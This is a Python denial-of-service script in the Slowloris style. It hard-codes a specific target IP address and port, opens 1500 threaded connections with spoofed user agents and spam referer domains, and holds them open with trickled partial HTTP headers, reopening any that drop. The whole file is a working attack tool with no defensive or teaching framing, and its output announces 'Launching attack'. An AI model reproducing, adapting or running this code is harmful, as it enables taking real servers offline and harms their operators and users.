# Libraries
import ssl
import time
import random
import socket
from concurrent.futures import ThreadPoolExecutor

# Constants
CONNECTIONS_AMOUNT = 1500
THREADS_AMOUNT = CONNECTIONS_AMOUNT * 0.35
TARGET_ADDRESS = "92.222.117.57"
TARGET_PORT = 80
WAIT_TIME = 15
TIMEOUT = 10
VERBOSE = True

USER_AGENTS = [
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
    "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",
]
REFERERS = [
    "1-best-seo.com",
    "1-free-share-buttons.com",
    "100-reasons-for-seo.com",
    "100dollars-seo.com",
    "12-reasons-for-seo.net",
    "12masterov.com",
    "12u.info",
    "15-reasons-for-seo.com",
    "1kreditzaim.ru",
    "1pamm.ru",
    "1st-urist.ru",
    "1webmaster.ml",
    "1wek.top",
    "1winru.ru",
    "1x-slot.site",
    "1x-slots.site",
    "1xbet-entry.ru",
    "1xbetcc.com",
    "1xbetonlines1.ru",
    "1xbetportugal.com",
]


# Function to show messages
def show_message(message):
    if VERBOSE:
        print(message)


# Function to create a socket
def create_socket(*args):
    try:
        # Create socket
        connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        connection.settimeout(TIMEOUT)

        # Use SSL
        if TARGET_PORT == 443:
            ssl_context = ssl.create_default_context()
            ssl_context.check_hostname = False
            ssl_context.verify_mode = ssl.CERT_NONE
            connection = ssl_context.wrap_socket(
                connection, server_hostname=TARGET_ADDRESS
            )

        # Initiate a connection
        connection.connect((TARGET_ADDRESS, TARGET_PORT))

        # Send header
        headers = [
            f"GET /?{random.randint(0, 2000)} HTTP/1.1",
            f"Accept-Language: en-US,en;q=0.9",
            f"User-Agent: {random.choice(USER_AGENTS)}",
            f"Referer: {random.choice(REFERERS)}",
        ]
        header = "\r\n".join(headers)
        connection.send(header.encode("utf-8"))

        # Return socket
        return connection
    except socket.error:
        return None
    except Exception as error:
        show_message(f"An unexpected error occurred while creating a socket: {error}")


# Function to create a set of sockets
def create_socket_set(socket_amount):
    with ThreadPoolExecutor(max_workers=THREADS_AMOUNT) as executor:
        created_sockets = executor.map(create_socket, range(socket_amount))

    # Return successful sockets
    return list(filter(None, created_sockets))


# Function to send data through a socket
def send_data(connection, socket_set):
    header = f"X-a: {random.randint(1, 5000)}\r\n"
    try:
        connection.send(header.encode("utf-8"))
    except socket.error:
        socket_set.remove(connection)


# Main function
if __name__ == "__main__":
    # Variables
    socket_set = []

    # Main loop
    try:
        # Create a set of sockets
        show_message(f"Launching attack to {TARGET_ADDRESS} on port {TARGET_PORT}...")
        show_message(f"Creating {CONNECTIONS_AMOUNT} connections...\n")
        socket_set = create_socket_set(CONNECTIONS_AMOUNT)

        while True:
            # Try to send data through each socket
            show_message("Trying to send data through each active connection...\n")
            with ThreadPoolExecutor(max_workers=THREADS_AMOUNT) as executor:
                executor.map(send_data, socket_set)

            # Create sockets if they have been closed
            remaining_sockets = len(socket_set)
            required_amount = CONNECTIONS_AMOUNT - remaining_sockets
            show_message(
                f"Data was sent through {remaining_sockets} active connections."
            )

            if required_amount > 0:
                # Try to create new connections
                show_message(
                    f"It seems {required_amount} connections were lost in the process."
                )
                show_message(f"Trying to initiate missing connections...")
                socket_set += create_socket_set(required_amount)

                # Check if new connections were created
                new_amount = len(socket_set) - remaining_sockets
                if new_amount > 0:
                    show_message(f"{new_amount} connections have been initiated.\n")
                else:
                    show_message("No new connections could be initiated.\n")

            # Wait before continuing
            show_message(f"Waiting {WAIT_TIME} seconds before continuing...")
            time.sleep(WAIT_TIME)
    except KeyboardInterrupt:
        show_message("The process has been stopped.")
    except Exception as error:
        show_message(f"An unexpected error occurred: {error}")
